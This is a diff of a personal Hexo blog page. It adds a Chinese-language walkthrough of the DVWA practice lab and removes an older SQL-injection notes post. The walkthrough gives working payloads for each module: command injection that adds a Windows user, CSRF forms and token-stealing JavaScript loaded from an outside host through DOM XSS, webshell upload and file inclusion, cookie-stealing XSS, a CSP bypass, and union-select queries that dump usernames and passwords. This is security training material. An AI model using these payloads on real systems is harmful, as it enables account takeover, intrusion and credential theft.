@@ -146,6 +146,119 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://aomandetiankong.github.io/2022/02/27/dvwa/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/27/dvwa/" class="post-title-link" itemprop="url">dvwa</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-02-27 01:53:49 / Modified: 01:55:56" itemprop="dateCreated datePublished" datetime="2022-02-27T01:53:49+08:00">2022-02-27</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>Brute Force<br>审计后台代码，并未做出什么限制，使用万能密码或抓包进行爆破即可破解<br>相比Low级别的代码，Medium级别的代码主要增加了mysql_real_escape_string函数，这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，基本上能够抵御sql注入攻击<br>HIgh<br>对于有token来防护csrf的，可以使用到这个功能进行爆破，因为每次用户的token都是随机的。<br>选择攻击模式为pitchfock，并且给要破解的token项带上美元符号<br>选择options将线程数设置为1（递归查找，将上一个请求的相应token作为下一个请求的payload的token，所以就不并发）<br>Grep-Extract模块进行相应设置，获取相应的token，截取相应token的前后标识，用于下次截取<br>Redirections模块设置允许重定向，选择always<br>点击payload的时候选择Recursive grep 并且把之前得到的token值粘贴到下方的方框中<br>可将token是为验证码此做法目的是为了套取上一个token以便实施爆破，一个验证码对应一个密码进行爆破，而此次密码爆出的token则用于下次（token由用户信息使用HS256算法及密钥进行签名，会处在回应之中进行回复，）</p>
+<p>Command Injection<br>linux的命令拼接符号：</p>
+<p>A;B A当命令相同时，可以将不同目标用；来隔离，但执行效果不变，如执行过程中发生错误，则只返回错误报告，但程序仍会执行。<br>A&amp;B 先执行A不论正确与否都会执行B命令<br>A&amp;&amp;B A执行成功时候才会执行B命令<br>A|B A执行的输出结果，作为B命令的参数，A不论正确与否都会执行B命令<br>A||B A 执行失败后才会执行B命令<br>可以看到，服务器通过判断操作系统执行不同ping命令，但是对ip参数并未做任何的过滤，导致了严重的命令注入漏洞。<br>ping自己<br>输入127.0.0.1可以通那么我们就是用&amp;&amp;<br>127.0.0.1&amp;&amp;net user<br>127.0.0.1&amp;&amp;net user zzyy 111 /add<br>127.0.0.1&amp;&amp;net user<br>127.0.0.1&amp;&amp;net user zzyy /delete<br>127.0.0.1&amp;&amp;net user<br>//127.0.0.1&amp;&amp;whoami<br>MID难度<br>因为被过滤的只有”&amp;&amp;”与” ;”，所以”&amp;”不会受影响。<br>输入127.0.0.1&amp;ipconfig<br>由于使用的是str_replace把”&amp;&amp;” 、”;”替换为空字符，因此可以采用以下方式绕过：<br>127.0.0.1&amp;;&amp;ipconfig<br>High类似<br>Impossible难度使用了csrf token，同时限制参数ip必须为数字.数字.数字.数字<br>CSRF<br>在不存在token的前提下，最简单的方法就是抓包后删去请求头中的Referer再次提交，如果提交仍然有效则说明很大可能存在CSRF漏洞。</p>
+<p>构造恶意连接<br><a target="_blank" rel="noopener" href="http://192.168.31.155/DVWA-master/vulnerabilities/csrf/?password_new=1234&amp;password_conf=1234&amp;Change=Change">http://192.168.31.155/DVWA-master/vulnerabilities/csrf/?password_new=1234&amp;password_conf=1234&amp;Change=Change</a></p>
+<p>只要诱骗用户点击这个恶意链接，就会将在不知情的情况下将密码改为1234<br>判度是否存在csrf</p>
+<p>抓包，使用BP的PoC<br>在浏览器中测试，BP会自动创建一个站点<br>复制URL在浏览器中访问<br>访问该URL后，点击提交按钮<br>出现密码修改了，上传空密码，直接就改成空的了，说明存在CSRF<br>CSRF一般会构建一个黑客的站点，而这个站点的名称可以叫test.html或者直接就用默认的index.html，给用户个IP访问，直接就中招了<br><img src="http://192.168.31.155/DVWA-master/vulnerabilities/csrf/?password_new=hack&password_conf=hack&Change=Change#" border="0" style="display:none;"> </p><h1>404<h1> <h2>resource not found.<h2><br>Mid本题中stripos(str1, str2)检查str2在str1中出现的位置（不区分大小写)，如果有返//回True，反之FalseMedium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是192.168.31.155），希望通过这种机制抵御CSRF攻击。<br>恶意网站中HOST和referer并不相同如Host 192.168.31.155<br>Referer <a target="_blank" rel="noopener" href="http://192.168.31.103/">http://192.168.31.103/</a><br>这里采取伪造Host 192.168.31.155<br>Referer <a target="_blank" rel="noopener" href="http://192.168.31.103/192.168.31.155.php">http://192.168.31.103/192.168.31.155.php</a><br>进行绕过，并对后续进行url转码<p></p>
+<p>如上面的站点一样构建即可<br>2.或者采取编写表单进行绕过的方法<html></html></p>
+<head>
+    <meta charset="utf-8">
+    <title>CSRF</title>
+</head>
+<body>
+ 
+<form method="get" id="csrf" action="http://127.0.0.1/vulnerabilities/csrf/">
+    <input type="hidden" name="password_new" value="mrl64">
+    <input type="hidden" name="password_conf" value="mrl64">
+    <input type="hidden" name="Change" value="Change">
+</form>
+<script> document.forms["csrf"].submit(); </script>
+</body>
+
+这里用到了<script> document.forms["csrf"].submit(); </script>进行了对id为csrf表单的自动提交最后让用户访问url并自动提交即可：
+目录混淆法：将HTML页面放在127.0.0.1目录下，构建payload
+http://www.mrl64.com/127.0.0.1/csrf.html
+文件名混淆法：将HTML文件重命名为127.0.0.1，构建payload
+http://www.mrl64.com/127.0.0.1.html
+问号拼接法：由于HTML不接受参数，因此随便输入都可以绕过referer检测
+http://www.mrl64.com/csrf.html?mrl64
+High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。构建这个恶意链接就不可取了因为token是随机的无法伪造
+攻击页面获取修改密码页面的token
+有两种思路
+第一， 将该js上传到服务器的目录下，这样就是同一个域了
+第二， 利用xss，xss可以执行代码，获取token
+新建一个JS：
+
+<p>// 首先访问这个页面 来获取 token<br>var tokenUrl = ‘<a target="_blank" rel="noopener" href="http://127.0.0.1/vulnerabilities/csrf/&#39;">http://127.0.0.1/vulnerabilities/csrf/&#39;</a>;</p>
+<p>if(window.XMLHttpRequest) {<br>    xmlhttp = new XMLHttpRequest();<br>}else{<br>    xmlhttp = new ActiveXObject(“Microsoft.XMLHTTP”);<br>}</p>
+<p>var count = 0;<br>xmlhttp.withCredentials = true;<br>xmlhttp.onreadystatechange=function(){<br>    if(xmlhttp.readyState ==4 &amp;&amp; xmlhttp.status==200)<br>    {<br>          // 使用正则提取 token<br>        var text = xmlhttp.responseText;<br>        var regex = /user_token&#39; value=&#39;(.*?)&#39; /&gt;/;<br>        var match = text.match(regex);<br>        var token = match[1];<br>          // 发起 CSRF 请求 将 token 带入<br>        var new_url = ‘<a target="_blank" rel="noopener" href="http://127.0.0.1/vulnerabilities/csrf/?user_token=&#39;+token+&#39;&amp;password_new=111&amp;password_conf=111&amp;Change=Change&#39;">http://127.0.0.1/vulnerabilities/csrf/?user_token=&#39;+token+&#39;&amp;password_new=111&amp;password_conf=111&amp;Change=Change&#39;</a>;<br>        if(count==0){<br>            count++;<br>            xmlhttp.open(“GET”,new_url,false);<br>            xmlhttp.send();<br>        }<br>    }<br>};<br>xmlhttp.open(“GET”,tokenUrl,false);<br>xmlhttp.send();<br>然后把这个js上传到服务器上，在DOM SXX的High中引入这个js：<br><a target="_blank" rel="noopener" href="http://127.0.0.1/vulnerabilities/xss_d/?default=English&amp;a=">http://127.0.0.1/vulnerabilities/xss_d/?default=English&amp;a=</a><script src="http://www.xxxx.com/csrf.js"></script><br>访问之后就改密成功了。</p>
+<p>文件上传<br>简单版不用说上传一句话木马即可<br>Mid因为有move_uploaded_file()函数，所以可以尝试一下00截断<br>或者采取抓包更改文件名或content type<br>High<br>和之前差别不大，但是多了getimagesize()这个函数，意味着这里要是用图片木马<br>选取图片木马上传即可，但是jpg无法使用webshell连接，所以采取文件包含漏洞，在上传目录写入include.php并将url改成<a target="_blank" rel="noopener" href="http://127.0.0.1/hackable/uploads/include.php?file=12.jpg%EF%BC%88%E6%88%96%E5%88%A9%E7%94%A8%E5%8F%A6%E4%B8%80%E4%B8%AA%E6%A8%A1%E5%9D%97%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%89">http://127.0.0.1/hackable/uploads/include.php?file=12.jpg（或利用另一个模块的文件包含漏洞）</a><br>文件包含<br>简单未设置任何过滤<br>1.远程文件包含简单来说远程文件包含，就是可以包含其他主机上的文件，并当成php代码执行。<br>要实现远程文件包含的话，php配置的allow_url_include = on必须为on（开启）<br>来我们可以来实验一下，把这个配置打开。<br>“其他选项菜单”——“打开配置文件”——“php-ini”<br>修改URL<br><a target="_blank" rel="noopener" href="http://192.168.31.155/DVWA-master/vulnerabilities/fi/?page=C:%5Cphpstudy%5CPHPTutorial%5CWWW%5CDVWA-master%5Cphp.ini">http://192.168.31.155/DVWA-master/vulnerabilities/fi/?page=C:\phpstudy\PHPTutorial\WWW\DVWA-master\php.ini</a><br>获取了php.ini而后使用？Page=文件路径即可（本地为127.0.0.1）<br>Mid增加了对http://、https://、../、..\的过滤，但是过滤的方法是使用str_replace()函数，而且没有区分大小写，因此双写过滤与大小写过滤均可使用。<br>High//文件名必须以file开始，或只能为include.php<br>if( !fnmatch( “file*”, $file ) &amp;&amp; $file != “include.php” ) echo “ERROR: File not found!”;<br>要使用File协议，基本的格式如下：file:///文件路径<br>Insecure CAPTCHA<br>recaptcha_check_answer($privkey,$remoteip, $challenge,$response)<br>参数$privkey是服务器申请的private key，$remoteip是用户的ip，$challenge是recaptcha_challenge_field字段的值，来自前端页面 ，$response是recaptcha_response_field字段的值。函数返回ReCaptchaResponse class的实例，ReCaptchaResponse类有2个属性 ：is_valid是布尔型的，表示校验是否有效，<br>直接抓包修改step为2跳过第一阶段直接进入第二阶段即可修改密码<br>后续也可以如csrf一样构建站点<br>Mid与Low相比，增加了第一阶段的判断，设置一个标志位passed_capt，如果身份验证通过了，就设置为true那么我们就主动添加一个参数passed_captcha<br>step=2&amp;password_new=bbb&amp;password_conf=bbb&amp;Change=Change&amp;passed_captcha=true<br>High服务器的验证逻辑是当$resp（这里是指谷歌返回的验证结果）是false，并且参数recaptcha_response_field不等于hidd3n_valu3（或者http包头的User-Agent参数不等于reCAPTCHA）时，就认为验证码输入错误，反之则认为已经通过了验证码的检查。搞清楚了验证逻辑，剩下就是伪造绕过了，由于$resp参数我们无法控制，所以重心放在参数recaptcha_response_field、User-Agent上。直接抓包更改即可轻松解决<br>SQL<br>简单的sql注入<br>Get1正常回显，1‘弹出错误可得出闭合方式为单引号<br>正常注入发现<br>这里采取16进制输出union select 1,hex(concat(table_name)) from information_schema.tables where table_schema=database()–+&amp;Submit=Submit#<br>Midpost注入抓包后注入即可<br>high使用了session防止自动化攻击，查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入（自动化注入），因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。<br>盲注<br>Medium级别的代码利用mysql_real_escape_string函数对特殊符号<br>\x00,\n,\r,,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。<br>和普通的SQL注入方式差不多，只是需要BP来抓包修改参数值<br>High对于LIMIT 1的限制输出记录数目，可以利用#注释其限制；服务端可能会随机执行sleep()函数，做执行，则延迟的时间是随机在2-4s，这样会对正常的基于时间延迟的盲注测试造成干扰。因此可以考虑用基于布尔的盲注进行测试</p>
+<p>Weak Session IDs<br>抓包后在hackbar中填入cookie<br>Mid使用时间戳<br>if ($_SERVER[‘REQUEST_METHOD’] == “POST”) { $cookie_value = time();<br>High<br>setcookie(name,value,expire,path,domain,secure,httponly)<br>oname 必需。规定cookie的名称。<br>ovalue 必需。规定cookie的值。<br>oexpire 可选。规定cookie的有效期。<br>opath 可选。规定cookie的服务器路径。<br>odomain 可选。规定cookie的域名。<br>osecure 可选。规定是否通过安全的HTTPS连接来传cookie。<br>ohttponly 可选。规定是否Cookie仅可通过HTTP协议访问。<br>不仅使用到了加1和md5进行加密<br>Xss dos</p>
+<script>alert(document.cookie)</script>
+<p>在url后面加入这个则可弹窗出括号内内容或者xx＝<br>添加了php后端过滤，查找&lt;script字符串在default变量值中第一次出现的位置（不区分大小写），如果匹配则手动将defalut改成English。<br>这里我们就不能直接写入JS脚本了，这个难度下我们可以通过闭合标签来解决这个问题：</p>
+<img src="/2022/02/27/dvwa/x" onerror="alert(document.cookie)">
+<iframe onload="alert(document.cookie)">
+<img src="/2022/02/27/dvwa/x" onerror="alert(document.cookie)">
+    
+<p>High对default的值进行了白名单处理可以用&amp;连接另一个自定义变量或者用#借助注释进行绕过：&amp;a=<script>alert(document.cookie)</script><br>#<script>alert(document.cookie)</script><br>reflected-XSS<br>反射型和DOM型的XSS差别主要在于，反射型是会往后台服务器发送请求，而DOM型直接在前端进行解析；<br>和dos差不多<br>Stored-XSS<br>由于是储存型XSS，所以要记得在注入后及时删除，不然会影响后面难度的注入。<br>这个页面看起来就很像留言板了，后端也是没有什么过滤，因此我们可以在massage中写入恶意JS脚本：<br>CSP简单理解就是白名单，是浏览器的安全策略。如果标签或服务器中返回的HTTP头中有Content-Security-Policy标签，浏览器就会根据其判断哪些网页资源可以被解析执行。CSP极大提升了网页的安全性，针对XSS起到了极大作用。<br>Easy查看后端php或者html头都可以发现允许包含的url为self、pastebin.com、hastebin.com、jquery和google analytics。我们依次访问（需要魔法上网）可以发现其中pastebin.com是一个文本分享的网站，我们可以通过在该网站写入一个恶意JS脚本，再通过靶场的包含将JS包含进去。<br>写入并创建恶意JS脚本，然后点击raw生成url：<br>Mid错误提示告诉我们, 因为头部指定了 nonce 值, 所以自动忽略了 ‘unsafe-inline’ 这个参数. 因此可以判断这两个参数是不能共存的, 而且如果共存, 后者是会覆盖前者的. 正确的防御方式下的 nonce 值不应该是个固定值, 而是应该是个随机生成的值, 这样才能真正达到防止 XSS 的目的.<br>$headerCSP = “Content-Security-Policy: script-src ‘self’ ‘unsafe-inline’ ‘nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=’;”;<br>这里面没有可以类似于上一难度中可以直接包含的网页，但是有一个关键：nonce。<br>script-src是可以设置一些特殊值的：<br>ounsafe-inline：允许执行页面内嵌的<script>标签和事件监听函数<br>ounsafe-eval：允许将字符串当作代码执行，比如使用eval、setTimeout、setInterval和Function等函数。<br>ononce：每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个 token，才会执行<br>ohash：列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行。<br>ps.nonce值和hash值还可以用在style-src选项，控制页面内嵌的样式表</p>
+<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(document.cookie)</script>
+
+</p><p>当按下按钮后，触发id=”slove”，即触发click事件使得clickButton()执行，使得一个新的<script>标签作为<body>中的子元素写入，内容是src = "source/jsonp.php?callback=solveSum"，因此我们会发现html中多出了一行：</p>
+<p>这样浏览器就会发起请求：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/vulnerabilities/csp/source/jsonp.php?callback=solveSum">http://127.0.0.1/vulnerabilities/csp/source/jsonp.php?callback=solveSum</a><br>我们来访问一下这个url：</p>
+<p>浏览器收到请求过后收到answer值，这个值通过solveSum()返回到页面中，得到了15.<br>那么了解到整个原理之后，我们就可以开始思考注入方式了。我们知道当callback=solveSum时触发了这个函数，那么我们是不是可以自己写入一点东西进去，例如：<br>    ?callback=alert(documemt.cookie)</p>
+<p>我们发现这样JS就被写入了，但是我们应该如何注入呢，我们发现后端php中有这么一行：<br>    &lt;?php<br>if (isset ($_POST[‘include’])) {<br>$page[ ‘body’ ] .= “<br>    “ . $_POST[‘include’] . “<br>“;<br>}<br>POST提交的include参数会包含到<body>中</p>
+<p>成功。<br>include=&lt;script src=source/jsonp.php?callback=alert(document.cookie)&gt;</script><br>JS<br>Easy审计代码，MD5（rot13（））<br>先进行rot13再进行md5而后一一尝试<br>2.用浏览器console<br>按F12，一般会出现Elements，我们进入Console模式<br>输入alert(md5(rot13(“success”)))后，回车搞定而后抓包修改数值即可<br>复现过程-High<br>从源码得知，生成 token 的步骤是：</p>
+<p>1、执行token_part_1(“ABCD”, 44)<br>2、执行token_part_2(“XX”)(原本是延迟 300ms执行的那个）<br>3、点击按钮的时候执行 token_part_3<br>所以思路是输入框输入success在Console执行<br>token_part_1(“ABCD”, 44)<br>oken_part_2(“XX”)<br>提交<br>复现过程-Medium<br>看代码的逻辑，token为<br>alert(do_something(“XX”+‘success’+“XX”));<br>在Console中执行</p>
+</iframe></h2></h2></h1></h1>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://aomandetiankong.github.io/2022/02/22/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -750,70 +863,6 @@ if(isset($file)){
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://aomandetiankong.github.io/2021/11/22/sql%E5%AD%A6%E4%B9%A01/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/11/22/sql%E5%AD%A6%E4%B9%A01/" class="post-title-link" itemprop="url">sql学习1</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2021-11-22 22:36:40 / Modified: 22:38:52" itemprop="dateCreated datePublished" datetime="2021-11-22T22:36:40+08:00">2021-11-22</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>sql 1<br>常见手动 sql 注入的闭合方式<br>or 1=1<br>‘or 1=1<br>“or 1=1<br>)or 1=1<br>‘)or 1=1<br>“) or 1=1<br>“))or 1=1</p>
-<p>具体使用哪种方式取决于 SQL语句使用了什么方式，我们可以在注入点输入 反斜杠 \ 来判断页面使用的哪种闭合方式</p>
-<p>\ 表示转义，直接输入 \ 会将字段的闭合方式暴露出来，因为被转义不生效，导致SQL 语句报错，并爆出闭合方式</p>
-<p>弹出： ‘1’ LIMIT 0,1 这个错。发现\转义后有一个单引号，说明此 sql 语句基于单引号闭合。<br>爆破库名<br>-1’ union select 1,2,database()–+<br>1,2,database()<br>database() 替换了字段3，作用是查询当前数据库名称，其中1，2是为了补充 第一个和第二个字段的显示结果<br>拓展，常用<br>version()    – MySQL版本<br>user()       – 数据库用户名<br>database()   – 数据库名称<br>@@datadir    – 数据库路径<br>@@version_compile_os  – 操作系统版本<br>列出当前数据库中的所有表的名称<br>5.0以下和5.0以上的区别    5.0以下没有 information_schema 这个数据表，只能爆破表<br>5.0以下多用户单操作，5.0以上多用户多操作<br>查看 information_schema 库中 tables 表名 table_schema 等于 security 的相关信息</p>
-<p>table_schema  – 该字段存储数据库名<br>table_name    – 该字段存储对应数据中的包括的表名<br>列出所有表名<br>-1’ union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database();–+<br>查询表中字段名<br>-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’数据库表的名字’–+</p>
-<p>-1’ union select 1,2,group_concat(一个或多个字段名，逗号分隔) from 表名–+或<br> union select 1,group_concat(username,0x3a,0x3a,password),3 from users –+（这里的1，2或1，3是为了构造一个数列来回显）<br>使用冒号将用户名和密码分开 0x3a<br>我们可以在每一个用户名：密码后面添加一个换行符; 0x3C,0x68,0x72,0x2F,0x3E</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -883,7 +932,7 @@ if(isset($file)){
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-count">20</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
